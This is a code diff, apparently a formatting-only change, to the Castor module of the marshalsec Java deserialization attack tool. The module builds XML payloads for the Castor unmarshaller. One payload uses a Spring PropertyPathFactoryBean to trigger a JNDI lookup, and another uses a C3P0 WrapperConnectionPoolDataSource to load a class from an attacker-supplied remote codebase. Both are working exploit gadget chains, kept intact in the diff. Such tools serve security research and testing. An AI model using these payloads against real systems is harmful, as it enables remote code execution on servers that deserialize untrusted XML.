@@ -23,21 +23,19 @@ SOFTWARE.
 package marshalsec;
 
 
-import java.io.StringReader;
-import java.io.StringWriter;
-
+import marshalsec.gadgets.Args;
+import marshalsec.gadgets.C3P0WrapperConnPool;
+import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
 import org.exolab.castor.xml.Marshaller;
 import org.exolab.castor.xml.Unmarshaller;
 import org.exolab.castor.xml.XMLContext;
 
-import marshalsec.gadgets.Args;
-import marshalsec.gadgets.C3P0WrapperConnPool;
-import marshalsec.gadgets.SpringAbstractBeanFactoryPointcutAdvisor;
+import java.io.StringReader;
+import java.io.StringWriter;
 
 
 /**
  * @author mbechler
- *
  */
 public class Castor extends MarshallerBase<String> implements SpringAbstractBeanFactoryPointcutAdvisor, C3P0WrapperConnPool {
 
@@ -47,7 +45,7 @@ public class Castor extends MarshallerBase<String> implements SpringAbstractBean
      * @see marshalsec.MarshallerBase#marshal(java.lang.Object)
      */
     @Override
-    public String marshal ( Object o ) throws Exception {
+    public String marshal(Object o) throws Exception {
         XMLContext context = new XMLContext();
         Marshaller m = context.createMarshaller();
         StringWriter sw = new StringWriter();
@@ -62,7 +60,7 @@ public class Castor extends MarshallerBase<String> implements SpringAbstractBean
      * @see marshalsec.MarshallerBase#unmarshal(java.lang.Object)
      */
     @Override
-    public Object unmarshal ( String data ) throws Exception {
+    public Object unmarshal(String data) throws Exception {
         XMLContext context = new XMLContext();
         Unmarshaller unmarshaller = context.createUnmarshaller();
         return unmarshaller.unmarshal(new StringReader(data));
@@ -70,13 +68,13 @@ public class Castor extends MarshallerBase<String> implements SpringAbstractBean
 
 
     @Override
-    @Args ( minArgs = 1, args = {
-        "jndiUrl"
+    @Args(minArgs = 1, args = {
+            "jndiUrl"
     }, defaultArgs = {
-        MarshallerBase.defaultJNDIUrl
-    } )
-    public Object makeBeanFactoryPointcutAdvisor ( UtilFactory uf, String[] args ) throws Exception {
-        String jndiName = args[ 0 ];
+            MarshallerBase.defaultJNDIUrl
+    })
+    public Object makeBeanFactoryPointcutAdvisor(UtilFactory uf, String[] args) throws Exception {
+        String jndiName = args[0];
         return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                 + "xmlns:java=\"http://java.sun.com\" xsi:type=\"java:org.springframework.beans.factory.config.PropertyPathFactoryBean\">"
                 + "<target-bean-name>" + jndiName + "</target-bean-name><property-path>foo</property-path>"
@@ -86,19 +84,19 @@ public class Castor extends MarshallerBase<String> implements SpringAbstractBean
 
 
     @Override
-    @Args ( minArgs = 2, args = {
-        "codebase", "class"
+    @Args(minArgs = 2, args = {
+            "codebase", "class"
     }, defaultArgs = {
-        MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
-    } )
-    public Object makeWrapperConnPool ( UtilFactory uf, String[] args ) throws Exception {
+            MarshallerBase.defaultCodebase, MarshallerBase.defaultCodebaseClass
+    })
+    public Object makeWrapperConnPool(UtilFactory uf, String[] args) throws Exception {
         return "<x xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                 + "xmlns:java=\"http://java.sun.com\" xsi:type=\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" "
-                + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[ 0 ], args[ 1 ]) + "\"/>";
+                + "user-overrides-as-string=\"" + C3P0WrapperConnPool.makeC3P0UserOverridesString(args[0], args[1]) + "\"/>";
     }
 
 
-    public static void main ( String[] args ) {
+    public static void main(String[] args) {
         new Castor().run(args);
     }
 }
